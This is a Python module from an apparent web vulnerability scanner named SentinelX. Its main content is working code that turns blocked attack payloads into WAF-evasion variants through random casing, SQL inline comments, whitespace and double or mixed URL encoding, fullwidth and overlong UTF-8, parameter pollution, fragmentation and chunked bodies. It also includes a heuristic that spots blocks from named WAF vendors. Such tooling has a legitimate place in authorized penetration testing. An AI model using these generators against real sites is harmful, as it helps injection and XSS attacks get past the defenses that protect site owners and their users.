"""SentinelX evasion: WAF-bypass payload variant generators.

These are applied CONDITIONALLY — only after standard payloads are blocked
(HTTP 403 with WAF indicators) or produce no results. This keeps request
counts low on unprotected targets while beating WAF-protected ones.

Each generator takes a base payload and yields evasion variants.
"""

from __future__ import annotations

import random
import urllib.parse


def case_variants(payload: str, count: int = 3) -> list[str]:
    """Random case variation: <ScRiPt>, SeLeCt, etc."""
    out = []
    for _ in range(count):
        out.append("".join(
            c.upper() if random.random() < 0.5 else c.lower()
            for c in payload))
    # dedupe
    return list(dict.fromkeys(out))


def inline_comments(payload: str) -> str:
    """Replace spaces with /**/ (MySQL/SQLi + XSS)."""
    return payload.replace(" ", "/**/")


def whitespace_alternatives(payload: str) -> list[str]:
    """Tab, newline, vertical-tab, form-feed as space replacements."""
    out = []
    for ws in ("%09", "%0a", "%0b", "%0c", "%0d"):
        out.append(payload.replace(" ", ws))
    return out


def double_encode(payload: str) -> str:
    return urllib.parse.quote(urllib.parse.quote(payload, safe=""), safe="")


def mixed_encode(payload: str) -> str:
    """Encode only special chars, leave alphanumerics — defeats naive decoders."""
    return "".join(
        urllib.parse.quote(c, safe="") if not c.isalnum() else c
        for c in payload)


def unicode_normalize_bypass(payload: str) -> str:
    """Fullwidth + overlong UTF-8 for < > ' \" — bypasses ASCII-only filters."""
    out = []
    for c in payload:
        o = ord(c)
        if c in "<>'\"":
            # fullwidth variant
            out.append(chr(o + 0xFEE0))
        elif c == " ":
            out.append("%c0%a0")  # overlong UTF-8 space
        else:
            out.append(c)
    return "".join(out)


def http_param_pollution(param: str, payload: str) -> list[dict]:
    """Return param-dict variants for HPP: duplicate params with split payload."""
    mid = len(payload) // 2
    return [
        {param: payload, f"{param}": payload},  # duplicate identical
        {param: payload[:mid], f"{param}_2": payload[mid:]},  # split (some stacks join)
    ]


def param_fragmentation(url: str, param: str, payload: str) -> list[str]:
    """Split payload across query string fragments that reassemble server-side."""
    # e.g., ?a=<scr&b=ipt> — some frameworks concatenate
    mid = len(payload) // 2
    sep = "&" if "?" in url else "?"
    base = url.split("?")[0]
    return [
        f"{base}{sep}{param}={urllib.parse.quote(payload[:mid], safe='')}"
        f"&{param}2={urllib.parse.quote(payload[mid:], safe='')}",
    ]


def chunked_body(payload: str) -> bytes:
    """Build a chunked transfer-encoded body (for smuggling-adjacent tests)."""
    chunks = [payload[i:i + 8] for i in range(0, len(payload), 8)]
    body = b""
    for c in chunks:
        body += f"{len(c):X}\r\n".encode() + c.encode() + b"\r\n"
    body += b"0\r\n\r\n"
    return body


# ---------------------------------------------------------------------------
# Conditional evasion: the main entry point modules should use
# ---------------------------------------------------------------------------
WAF_BLOCK_INDICATORS = (
    "waf", "blocked", "forbidden", "incapsula", "imperva", "cloudflare",
    "akamai", "sucuri", "mod_security", "barracuda", "fortigate",
    "request rejected", "access denied", "not acceptable",
)


def looks_waf_blocked(status: int, body: str) -> bool:
    """Heuristic: was this response a WAF block?"""
    if status not in (403, 406, 419, 429, 501):
        return False
    bl = body.lower()
    return any(ind in bl for ind in WAF_BLOCK_INDICATORS)


def evasion_variants(payload: str, max_variants: int = 6) -> list[tuple[str, str]]:
    """Generate (variant_name, variant_payload) pairs for a blocked payload.
    Bounded to max_variants to control request count."""
    variants: list[tuple[str, str]] = []
    variants.append(("case-random", case_variants(payload, 1)[0]))
    variants.append(("inline-comments", inline_comments(payload)))
    variants.append(("tab-whitespace", payload.replace(" ", "%09")))
    variants.append(("double-encode", double_encode(payload)))
    variants.append(("mixed-encode", mixed_encode(payload)))
    variants.append(("unicode-bypass", unicode_normalize_bypass(payload)))
    return variants[:max_variants]
